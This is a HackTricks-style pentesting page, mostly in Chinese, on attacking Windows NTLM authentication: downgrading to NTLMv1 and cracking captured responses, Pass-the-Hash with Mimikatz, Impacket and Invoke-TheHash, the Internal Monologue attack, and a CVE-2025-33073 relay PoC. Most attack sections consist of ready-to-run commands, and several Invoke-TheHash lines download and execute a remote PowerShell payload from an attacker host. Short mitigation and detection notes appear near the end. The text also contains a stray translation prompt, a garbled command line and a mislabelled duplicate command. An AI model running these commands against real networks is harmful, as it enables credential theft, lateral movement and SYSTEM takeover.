# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

在 **Windows XP 和 Server 2003** 环境中，会使用 LM (Lan Manager) hashes，不过众所周知，这些 hashes 很容易被破解。某个特定的 LM hash，`AAD3B435B51404EEAAD3B435B51404EE`, 表示没有使用 LM，相当于空字符串的 hash。

默认情况下，**Kerberos** 认证协议是主要方法。NTLM (NT LAN Manager) 会在特定情况下介入：没有 Active Directory、domain 不存在、由于配置不当导致 Kerberos 失效，或者在使用 IP address 而不是有效 hostname 发起连接时。

网络数据包中出现 **"NTLMSSP"** header 表示正在进行 NTLM authentication 过程。

对 LM、NTLMv1 和 NTLMv2 认证协议的支持由位于 `%windir%\Windows\System32\msv1\_0.dll` 的特定 DLL 提供。

**Key Points**:

- LM hashes 容易受到攻击，空 LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) 表示未使用 LM。
- Kerberos 是默认认证方法，NTLM 仅在特定条件下使用。
- NTLM authentication packets 可通过 "NTLMSSP" header 识别。
- LM、NTLMv1 和 NTLMv2 协议由系统文件 `msv1\_0.dll` 支持。

## LM, NTLMv1 and NTLMv2

你可以检查并配置将使用哪个协议：

### GUI

执行 _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. 一共有 6 个级别（从 0 到 5）。

![](<../../images/image (919).png>)

### Registry

这将设置为 level 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Possible values:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user** 输入他的 **credentials**
2. 客户端机器 **sends an authentication request**，发送 **domain name** 和 **username**
3. **server** 发送 **challenge**
4. **client encrypts** **challenge**，使用密码的 hash 作为 key，并将其作为 response 发送
5. **server sends** 给 **Domain controller** **domain name、username、challenge 和 response**。如果 **isn't** 配置 Active Directory，或者 domain name 就是服务器名称，则凭据会在本地 **checked locally**。
6. **domain controller checks if everything is correct**，并将信息发送给 server

**server** 和 **Domain Controller** 能够通过 **Netlogon** server 创建一个 **Secure Channel**，因为 Domain Controller 知道 server 的密码（它存储在 **NTDS.DIT** db 中）。

### Local NTLM authentication Scheme

认证方式与前面提到的相同，**but** **server** 知道尝试认证的用户在 **SAM** 文件中的 hash。因此，server 不会去询问 Domain Controller，而是 **will check itself** 该用户是否可以认证。

### NTLMv1 Challenge

**challenge** 长度是 8 bytes，**response** 长度是 24 bytes。

**hash NT**（16bytes）被分成 3 部分，每部分 7bytes（7B + 7B + (2B+0x00\*5)）：**last part is filled with zeros**。然后，**challenge** 会分别用每一部分进行 **ciphered**，再把得到的 **ciphered bytes** 拼接起来。总计：8B + 8B + 8B = 24Bytes。

**Problems**：

- Lack of **randomness**
- 这 3 部分可以被 **attacked separately** 来找出 NT hash
- **DES is crackable**
- 第 3 个 key 总是由 5 个零组成。
- 对于同一个 **challenge**，**response** 也会相同。所以，你可以向受害者提供一个 **challenge**，字符串为 "**1122334455667788**"，然后使用 **precomputed rainbow tables** 攻击该 response。

### NTLMv1 attack

如今，环境中配置了 Unconstrained Delegation 的情况已经越来越少见，但这并不意味着你不能 **abuse a Print Spooler service**。

你可以滥用你在 AD 上已经拥有的一些 credentials/sessions，去 **ask the printer to authenticate** 到某个由你控制的 host。然后，使用 `metasploit auxiliary/server/capture/smb` 或 `responder`，你可以把 authentication challenge 设置为 `1122334455667788`，捕获认证尝试；如果它使用的是 **NTLMv1**，你就能够 **crack it**。\
如果你使用的是 `responder`，可以尝试使用 flag `--lm` 来尝试 **downgrade** 这个 **authentication**。\
_注意：这种技术要求认证必须使用 NTLMv1（NTLMv2 无效）。_

记住，printer 在认证时会使用 computer account，而 computer accounts 使用的是 **long and random passwords**，你 **probably won't be able to crack** 它们，无法靠常见的 **dictionaries**。但是，**NTLMv1** 认证 **uses DES**（[more info here](#ntlmv1-challenge)），所以使用一些专门用于破解 DES 的服务，你就能破解它（例如可以使用 [https://crack.sh/](https://crack.sh) 或 [https://ntlmv1.com/](https://ntlmv1.com)）。

### NTLMv1 attack with hashcat

也可以使用 NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) 来破解 NTLMv1，它会把 NTLMv1 messages 格式化成一种可以被 hashcat 破解的方法。

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
would output the below:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
请提供要翻译的文件内容。
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
运行 hashcat（最好通过 hashtopolis 之类的工具进行分布式处理），否则这将需要几天时间。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
在这种情况下，我们知道它的密码是 password，所以为了演示目的我们要作弊：
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
现在我们需要使用 hashcat-utilities 将已破解的 des keys 转换为 NTLM hash 的一部分：
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
最后一部分：
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Combine them together:
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge** 长度是 8 bytes，并且会发送 **2 个 response**：一个长度为 **24 bytes**，另一个长度是**variable**。

**第一个 response** 的生成方式是：使用 **HMAC_MD5** 对由 **client 和 domain** 组成的 **string** 进行加密，并以 **NT hash** 的 **hash MD4** 作为 **key**。然后，**result** 会作为 **key**，再用 **HMAC_MD5** 对 **challenge** 进行加密。除此之外，还会添加一个 **8 bytes** 的 client challenge。总计：24 B。

**第二个 response** 使用 **several values** 生成（一个新的 client challenge、一个用于避免 **replay attacks** 的 **timestamp**...）

如果你有一个捕获了成功认证过程的 **pcap**，你可以按照这个指南获取 domain、username、challenge 和 response，并尝试去 creak 密码： [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**一旦你有了受害者的 hash**，你就可以用它来 **impersonate** 它。\
你需要使用一个 **tool** 来 **perform** 基于该 hash 的 **NTLM authentication**，或者你也可以创建一个新的 **sessionlogon**，并把这个 hash **inject** 到 **LSASS** 中，这样当任何 **NTLM authentication** 被执行时，都会使用那个 hash。最后一种方式就是 mimikatz 所做的事情。

**请记住，你也可以使用 Computer accounts 执行 Pass-the-Hash attacks。**

### **Mimikatz**

**Needs to be run as administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).

### Pass-the-Hash from linux

You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- There are several more Impacket binaries...

### Invoke-TheHash

You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

这个函数是**其他所有函数的混合**。你可以传入**多个主机**，**排除**一些主机，并**选择**你想使用的**选项**（_SMBExec、WMIExec、SMBClient、SMBEnum_）。如果你选择了**SMBExec** 和 **WMIExec** 中的**任意一个**，但你**没有**提供任何 _**Command**_ 参数，它就只会**检查**你是否有**足够的权限**。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**需要以管理员身份运行**

这个工具会做和 mimikatz 相同的事情（修改 LSASS 内存）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 使用用户名和密码进行手动 Windows 远程执行


{{#ref}}
../lateral-movement/
{{#endref}}

## 从 Windows Host 提取凭据

**关于** [**如何从 Windows host 获取凭据，你应该阅读这个页面**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**。**

## Internal Monologue attack

Internal Monologue Attack 是一种隐蔽的凭据提取技术，允许 attacker **不直接与 LSASS process 交互** 就从受害者机器中检索 NTLM hashes。不同于 Mimikatz 直接从内存中读取 hashes，并且经常被 endpoint security solutions 或 Credential Guard 阻止，这种 attack 利用 **通过 Security Support Provider Interface (SSPI) 对 NTLM authentication package (MSV1_0) 的本地调用**。attacker 首先 **降级 NTLM 设置**（例如 LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic），以确保允许 NetNTLMv1。然后，他们冒充从正在运行的 processes 中获取的现有 user tokens，并在本地触发 NTLM authentication，使用已知 challenge 生成 NetNTLMv1 responses。

在捕获这些 NetNTLMv1 responses 之后，attacker 可以使用 **预计算的 rainbow tables** 快速恢复原始 NTLM hashes，从而进一步进行 Pass-the-Hash attacks 以进行 lateral movement。关键是，Internal Monologue Attack 依然隐蔽，因为它不会产生 network traffic、注入 code，或触发直接的 memory dumps，因此与 Mimikatz 之类的传统方法相比更难被防御者检测到。

如果 NetNTLMv1 不被接受——由于强制执行的 security policies，那么 attacker 可能无法检索到 NetNTLMv1 response。

为处理这种情况，Internal Monologue tool 已更新：如果 NetNTLMv1 失败，它会通过 `AcceptSecurityContext()` 动态获取 server token，以仍然 **捕获 NetNTLMv2 responses**。虽然 NetNTLMv2 更难破解，但在有限情况下，它仍可用于 relay attacks 或 offline brute-force。

PoC 可在 **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** 找到。

## NTLM Relay and Responder

**有关如何执行这些 attacks 的更详细指南，请阅读这里：**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## 从 network capture 中解析 NTLM challenges

**你可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## 通过 Serialized SPNs 的 NTLM & Kerberos *Reflection* (CVE-2025-33073)

Windows 包含多个缓解措施，试图阻止 *reflection* attacks，即将源自某个 host 的 NTLM（或 Kerberos）authentication relay 回 **同一个** host，以获取 SYSTEM privileges。

Microsoft 通过 MS08-068（SMB→SMB）、MS09-013（HTTP→SMB）、MS15-076（DCOM→DCOM）以及后续补丁破坏了大多数公开的 chains，但 **CVE-2025-33073** 表明，仍然可以通过滥用 **SMB client 截断包含 *marshalled*（serialized）target-info 的 Service Principal Names (SPNs)** 的方式绕过这些 protections。

### 该 bug 的 TL;DR
1. attacker 注册一个 **DNS A-record**，其 label 编码了一个 marshalled SPN —— 例如
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 诱使 victim 对该 hostname 进行 authentication（PetitPotam、DFSCoerce 等）。
3. 当 SMB client 将 target string `cifs/srv11UWhRCAAAAA…` 传给 `lsasrv!LsapCheckMarshalledTargetInfo` 时，对 `CredUnmarshalTargetInfo` 的调用会 **去除** 该 serialized blob，留下 **`cifs/srv1`**。
4. `msv1_0!SspIsTargetLocalhost`（或 Kerberos 的等价逻辑）现在会认为该 target 是 *localhost*，因为短 host 部分与 computer name（`SRV1`）匹配。
5. 因此，server 会设置 `NTLMSSP_NEGOTIATE_LOCAL_CALL`，并将 **LSASS’ SYSTEM access-token** 注入到该 context 中（对于 Kerberos，则会创建一个带 SYSTEM 标记的 subsession key）。
6. 使用 `ntlmrelayx.py` **或** `krbrelayx.py` 进行该 authentication relay，会在同一台 host 上获得完整的 SYSTEM rights。

### 快速 PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* 针对 **CVE-2025-33073** 的 KB patch 在 `mrxsmb.sys::SmbCeCreateSrvCall` 中增加了检查，阻止任何目标包含 marshalled info 的 SMB 连接（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）。
* 强制启用 **SMB signing**，即使在未打补丁的主机上也能防止 reflection。
* 监控类似 `*<base64>...*` 的 DNS 记录，并阻止 coercion vectors（PetitPotam、DFSCoerce、AuthIP...）。

### Detection ideas
* 抓包中出现 `NTLMSSP_NEGOTIATE_LOCAL_CALL`，且 client IP ≠ server IP。
* Kerberos AP-REQ 包含 subsession key，且 client principal 等于主机名。
* Windows Event 4624/4648 的 SYSTEM logons 后，紧接着同一主机发起 remote SMB writes。

关于利用 **SMB arbitrary ports** 和 **TCP connection reuse** 进入 `NT AUTHORITY\SYSTEM` 的 **March 2026** local reflection 变种，见：

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
